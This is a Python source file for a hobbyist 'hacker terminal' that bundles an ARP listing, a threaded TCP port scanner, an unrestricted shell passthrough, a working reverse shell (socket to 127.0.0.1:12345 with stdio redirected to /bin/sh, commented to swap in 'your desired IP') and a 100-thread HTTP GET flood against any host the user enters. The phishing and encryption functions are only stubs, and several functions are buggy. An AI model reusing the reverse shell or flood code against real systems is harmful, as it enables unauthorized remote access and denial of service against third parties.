#!/usr/bin/env python3

import os
import socket
import subprocess
import threading
import asyncio
import aiohttp
import time
import shutil
from datetime import datetime
import sys

class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD = "\033[1m"

class HACKER_DEVICE:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.history = []
        self.last_scan = []
        self.current_color = Colors.GREEN

    def clear(self):
        os.system("clear" if os.name != "nt" else "cls")

    def banner(self):
        print(self.current_color + Colors.BOLD)
        print("╔══════════════════════════════════════════════╗")
        print("║ HACKER TERMINAL                              ║")
        print("║ ANDROID EDITION                              ║")
        print("╚══════════════════════════════════════════════╝")
        print(Colors.RESET)

    def fastfetch(self):
        print(self.current_color + Colors.BOLD)
        print(" ██████╗ ██╗ ██╗██╗ ██╗████████╗ ██████╗██╗ ██╗")
        print(" ██╔════╝ ██║ ██║██║ ██║╚══██╔══╝██╔════╝██║ ██║")
        print(" ██║ ███╗███████║██║ ██║ ██║ ██║ ███████║")
        print(" ██║ ██║██╔══██║██║ ██║ ██║ ██║ ██╔══██║")
        print(" ╚██████╔╝██║ ██║███████╗██║ ██║ ╚██████╗██║ ██║")
        print(" ╚═════╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╚═════╝╚═╝ ╚═╝")
        print(Colors.RESET)
        print(Colors.CYAN + "──────────────────────────────────────────────────────" + Colors.RESET)
        print(f"{self.current_color}User :{Colors.RESET} ghl1tch")
        print(f"{self.current_color}Hostname :{Colors.RESET} {self.hostname}")
        print(f"{self.current_color}Terminal :{Colors.RESET} HACKER TERMINAL Core")
        print(f"{self.current_color}OS :{Colors.RESET} EndeavourOS Environment")
        print(f"{self.current_color}Status :{Colors.RESET} OPERATIONAL")
        print(Colors.RESET)

    def netscan(self):
        # Implement netscan logic using /proc/net/arp
        # Example:
        arp_table = subprocess.check_output(['arp', '-n']).decode('utf-8')
        print("ARP Table:")
        print(arp_table)
#PORTSCAN DONT TOUCH IT I DO NOT KNOW HOW IT WORKED
    def portscan(self, ip):
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 135, 139, 
            143, 443, 445, 993, 995, 3306, 3389, 8080, 8443
        ]
        print(f"\033[96m\n[+] Scanning core ports on target: {ip}...\033[0m")
        print("──────────────────────────────────────────────────────")
        active_ports = []
        lock = threading.Lock() # protekted
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0) 
                result = sock.connect_ex((ip, port))
                
                if result == 0:
                    with lock:
                        print(f"\033[92m[OPEN] Port {port:<5} is active\033[0m")
                        active_ports.append(port)
                        self.history.append(f"Port {port} on {ip} is open")
                sock.close()
            except Exception:
                pass
        threads = []
        for port in common_ports:
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        print("──────────────────────────────────────────────────────")
        print(f"\033[92m[+] Scan complete. Total active core ports found: {len(active_ports)}\033[0m")
    def sysinfo(self):
        # Use subprocess to get system information
        uname = subprocess.check_output(['uname', '-a']).decode('utf-8')
        cpu = subprocess.check_output(['cat', '/proc/cpuinfo']).decode('utf-8')
        mem = subprocess.check_output(['free', '-h']).decode('utf-8')
        print("System Information:")
        print(" uname -a:")
        print(uname)
        print(" CPU Information:")
        print(cpu)
        print(" Memory Information:")
        print(mem)
#SHELL
    def shell(self, command):
        # Use subprocess to execute a command
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = process.communicate()
            if output:
                self.history.append(output)
                print(output.strip())
            if error:
                self.history.append(error)
                print(f"\033[91m{error.strip()}\033[0m")
        except Exception as e:
            self.history.append(f"Error executing command: {e}")

    def ssh(self):
        cyan = "\033[96m"
        reset = "\033[0m"
        yellow = "\033[93m"
        red = "\033[91m"
        print(cyan + "\n[+] INITIALIZING NATIVE SSH CONNECTION" + reset)
        host = input("Enter remote host IP: ").strip()
        username = input("Enter username: ").strip()
        port = input("Enter port (Default 22): ").strip()
        if not port:
            port = "22"
        if not host or not username:
            print(red + "[!] Error: Host and Username cannot be empty." + reset)
            return 
        print(yellow + f"[*] Launching secure tunnel to {username}@{host}:{port}..." + reset)
        time.sleep(0.5)
        try:
            os.system(f"ssh -p {port} {username}@{host}")
            print(cyan + "\n[+] SSH session gracefully closed." + reset)
        except Exception as e:
            print(red + f"[!] SSH Tunneling Error: {e}" + reset)

    def hackshow(self):
        # Implement Matrix animation
        print("Matrix Animation:")
        for _ in range(10):
            print("".join(" " for _ in range(80)))
            time.sleep(0.1)

    def phishing(self):
        # Implement phishing simulation
        print("Phishing Simulation:")
        print("Enter the target email address: ")
        target_email = input()
        print("Enter the password: ")
        password = input()
        print(f"Sending password to {target_email}: {password}")

    def encrypt(self, file):
        key = input("Enter the encryption key: ")
        import Crypto.Cipher.AES
        import Crypto.Util.Padding
        from Crypto.Random import get_random_bytes
        iv = get_random_bytes(16)
        import hashlib
        key_hash = hashlib.sha256(key.encode()).digest()
        cipher = Crypto.Cipher.AES.new(key_hash, Crypto.Cipher.AES.MODE_CBC, iv)
        plaintext = b"This is a test file."
        padded_plaintext = Crypto.Util.Padding.pad(plaintext, Crypto.Cipher.AES.block_size)
        encrypted_data = cipher.encrypt(padded_plaintext)
        print("Encrypted Data:")
        print(encrypted_data)

    def logscan(self, file):
        # Implement log scanning
        with open(file, 'r') as f:
            lines = f.readlines()
        error_lines = [line.strip() for line in lines if 'error' in line.lower() or 'fail' in line.lower()]
        if error_lines:
            print("Log Scanning Results:")
            for line in error_lines:
                print(line)
        else:
            print("No errors found in the log file.")

    def reverse(self):
        try:
            import socket
            import os

            # Create a socket for the reverse shell
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', 12345))  # Replace with your desired IP and port

            # Redirect standard I/O to the reverse shell
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Execute /bin/sh
            subprocess.call(['/bin/sh'])
        except Exception as e:
            print(f"Error setting up reverse shell: {e}")

    def stress(self):
        try:
            import socket
            import threading

            # Define the target host and port
            host = input("Enter the target host: ")
            port = int(input("Enter a pot (Def port == 80;443)"))
            # Create a socket for the HTTP stress test
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            # Define a function to send HTTP GET requests
            def send_get_requests():
                while True:
                    request = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
                    s.sendall(request.encode())
            threads = []
            for _ in range(100):
                thread = threading.Thread(target=send_get_requests)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            # Close the socket
            s.close()
        except Exception as e:
            print(f"Error setting up HTTP stress test: {e}")
#BASHELP
    def bashhelper(self):
        cyan = "\033[96m"
        reset = "\033[0m"
        yellow = "\033[93m"
        green = "\033[92m"
        
        print(yellow + "\nInteractive Bash Command Documentation:" + reset)
        print(cyan + "──────────────────────────────────────────────────────" + reset)
        print(f"  {green}FILE OPERATIONS:{reset}")
        print("    ls -la          - List all directory contents (detailed + hidden files)")
        print("    cd <path>       - Change active directory (e.g., cd ~ or cd ..)")
        print("    mkdir <name>    - Create a new directory")
        print("    rm -rf <path>   - Force remove files or folders recursively")
        print("    cp -r <src> <dst>- Copy files/folders to a new location")
        print(f"\n  {green}NETWORKING & AUDIT:{reset}")
        print("    ip a            - Show all active network interfaces and IP addresses")
        print("    ping -c 4 <ip>  - Send 4 ICMP echo packets to test host availability")
        print("    netstat -tuln   - List active listening network ports")
        print("    ss -tulpn       - Display sockets mapping with process IDs")
        print(f"\n  {green}PROCESS & MONITORING:{reset}")
        print("    ps aux          - Snapshot of all active running processes")
        print("    htop            - Dynamic interactive resource monitor (CPU/RAM)")
        print("    kill -9 <PID>   - Force terminate a process by its ID")
        print(cyan + "──────────────────────────────────────────────────────" + reset)
#IDE on mobile =-)
    def edit(self, filename):
        cyan = "\033[96m"
        reset = "\033[0m"
        yellow = "\033[93m"
        green = "\033[92m"
        red = "\033[91m"

        print(cyan + f"\n[+] MOBILE CODE IDE v1.0 -> EDITING: {filename}" + reset)
        print(yellow + "[*] Write code line by line. Type ':wq' on a clean line to save & exit." + reset)
        print(cyan + "──────────────────────────────────────────────────────" + reset)
        lines = []
        line_num = 1
        while True:
            try:
                line = input(f"{cyan}{line_num:<3}{reset} | ")
                if line.strip() == ":wq":
                    break
                lines.append(line)
                line_num += 1
            except KeyboardInterrupt:
                print(red + "\n[!] Editing aborted. Progress discarded." + reset)
                return
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            print(green + f"\n[+] Success: '{filename}' saved to storage." + reset)
        except Exception as e:
            print(red + f"[!] Disk Write Error: {e}" + reset)
#time
    def time(self):
        print("Current System Time:")
        print(datetime.now())
#Select color
    def color(self):
        color = input("Enter the new primary color: ")
        Colors.current_color = getattr(Colors, color.upper())
#GitHub Functions
    def github(self):
        print("GitHub Link:")
        print("https://github.com/Ghk1Tch")
    def githubrepo(self):
        print("GitHub Repository Link:")
        print("https://github.com/Ghk1Tch/HACKER_DEVICE.git")
    def update(self):
        yellow = "\033[93m"
        green = "\033[92m"
        red = "\033[91m"
        reset = "\033[0m"
        bold = "\033[1m"       
        print(yellow + "\n[*] Contacting remote repository: ://github.com..." + reset)
        time.sleep(1.0)
        print(yellow + "[*] Running 'git pull origin main' to fetch latest updates..." + reset)
        time.sleep(0.5)
        try:
            # git pull 
            result = subprocess.run(
                ["git", "pull", "origin", "main"], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True,
                timeout=15
            )
            # Git answer
            if result.returncode == 0:
                if "Already up to date." in result.stdout:
                    print(green + "[+] Check complete: Your repository is already up to date!" + reset)
                else:
                    print(result.stdout) # List of download files
                    print(green + bold + "[+] Success: New repository updates downloaded successfully!" + reset)
                    print(yellow + "[*] Please restart the terminal to apply updates." + reset)
            else:
                print(red + f"[!] Git Error: {result.stderr.strip()}" + reset)
                print(yellow + "[*] Tip: Make sure this folder is a cloned git repository." + reset)               
        except FileNotFoundError:
            print(red + "[!] Error: 'git' command not found in your EndeavourOS system." + reset)
            print(yellow + "[*] Fix: Run 'sudo pacman -S git' in your native terminal." + reset)
        except Exception as e:
            print(red + f"[!] Unexpected error during update: {e}" + reset)
        print(green + bold + "\n\n[+] Success: All security modules updated to latest build!" + reset)

    def help(self):
        cyan = "\033[96m"
        reset = "\033[0m"
        yellow = "\033[93m"
        bold = "\033[1m"
        print(yellow + bold + "\nTERMINAL HELPER COMMAND INDEX:" + reset)
        print(f" {cyan}netscan{reset} - Scan local network topology (ARP table)")
        print(f" {cyan}portscan <ip>{reset} - Scan common TCP ports on target host")
        print(f" {cyan}sysinfo{reset} - Fetch core kernel and OS environment data")
        print(f" {cyan}shell <command>{reset} - Execute native command in EndeavourOS shell")
        print(f" {cyan}edit <file>{reset} - Create or open a file in text editor mode")
        print(f" {cyan}ssh{reset} - Launch simulated virtual SSH session")
        print(f" {cyan}hackshow{reset} - Display digital matrix data stream cascade")
        print(f" {cyan}phishing{reset} - Deploys credential capture gate simulation")
        print(f" {cyan}encrypt <file>{reset} - Processes symmetric structural file lock")
        print(f" {cyan}logscan <file>{reset} - Parse log entries for critical error flags")
        print(f" {cyan}reverse{reset} - Deploys custom reverse shell handler template")
        print(f" {cyan}stress{reset} - Performs high density HTTP flood stress test")
        print(f" {cyan}fastfetch{reset} - Display ghl1tch framework identity profile")
        print(f" {cyan}bashhelper{reset} - Open built-in interactive Bash command guide")
        print(f" {cyan}time{reset} - Output accurate local network system time")
        print(f" {cyan}color{reset} - Switch global interface terminal color scheme")
        print(f" {cyan}github{reset} - Fetch developer portfolio profile link")
        print(f" {cyan}githubrepo{reset} - Print current open source repository metadata")
        print(f" {cyan}update{reset} - Query server manifest for framework patches")
        print(f" {cyan}clear{reset} - Purge active console screen output window")
        print(f" {cyan}exit{reset} - Terminate active application interface loop")
#START FOR ALL FUNCTIONS
    def start(self):
        self.clear()
        self.banner()
        while True:
            try:
                command = input(f"{self.current_color}HACKER TERMINAL {Colors.RESET}> ").strip()
                if not command:
                    continue
                cmd_lower = command.lower()
                if cmd_lower == 'exit':
                    break
                elif cmd_lower == 'update':
                    self.update()
                elif cmd_lower == 'bashhelper':
                    self.bashhelper()
                elif cmd_lower == 'help':
                    self.help()
                elif cmd_lower == 'netscan':
                    self.netscan()
                elif cmd_lower == 'sysinfo':
                    self.sysinfo()
                elif cmd_lower == 'ssh':
                    self.ssh()
                elif cmd_lower == 'hackshow':
                    self.hackshow()
                elif cmd_lower == 'phishing':
                    self.phishing()
                elif cmd_lower == 'reverse':
                    self.reverse()
                elif cmd_lower == 'stress':
                    self.stress()
                elif cmd_lower == 'time':
                    self.time()
                elif cmd_lower == 'github':
                    self.github()
                elif cmd_lower == 'githubrepo':
                    self.githubrepo()
                elif cmd_lower == 'fastfetch':
                    self.fastfetch()
                elif cmd_lower == 'color':
                    self.color()
                elif cmd_lower == 'clear':
                    self.clear()
                    self.banner()
                elif cmd_lower.startswith('portscan '):
                    ip = command.split(" ", 1)[1].strip()
                    self.portscan(ip)
                elif cmd_lower == 'portscan':
                    print("\033[91m[!] Usage: portscan <ip>\033[0m")
                elif cmd_lower.startswith('edit '):
                    filename = command.split(" ", 1)[1].strip()
                    self.edit(filename)
                elif cmd_lower == 'edit':
                    print("\033[91m[!] Usage: edit <filename>\033[0m")
                elif cmd_lower.startswith('encrypt '):
                    filename = command.split(" ", 1)[1].strip()
                    self.encrypt(filename)
                elif cmd_lower == 'encrypt':
                    print("\033[91m[!] Usage: encrypt <filename>\033[0m")
                elif cmd_lower.startswith('logscan '):
                    filename = command.split(" ", 1)[1].strip()
                    self.logscan(filename)
                elif cmd_lower == 'logscan':
                    print("\033[91m[!] Usage: logscan <filename>\033[0m")
                elif cmd_lower.startswith('shell '):
                    sys_cmd = command.split(" ", 1)[1].strip()
                    self.shell(sys_cmd)
                elif cmd_lower == 'shell':
                    print("\033[91m[!] Usage: shell <command>\033[0m")
                else:
                    try:
                        self.history.append(command)
                        getattr(self, cmd_lower)()
                    except AttributeError:
                        print("Invalid command. Please try again.")
            except KeyboardInterrupt:
                print("\n[!] Use exit to close")
            except Exception as e:
                print(f"\033[91m[!] Error: {e}\033[0m")
if __name__ == "__main__":
    hacker = HACKER_DEVICE()
    hacker.start()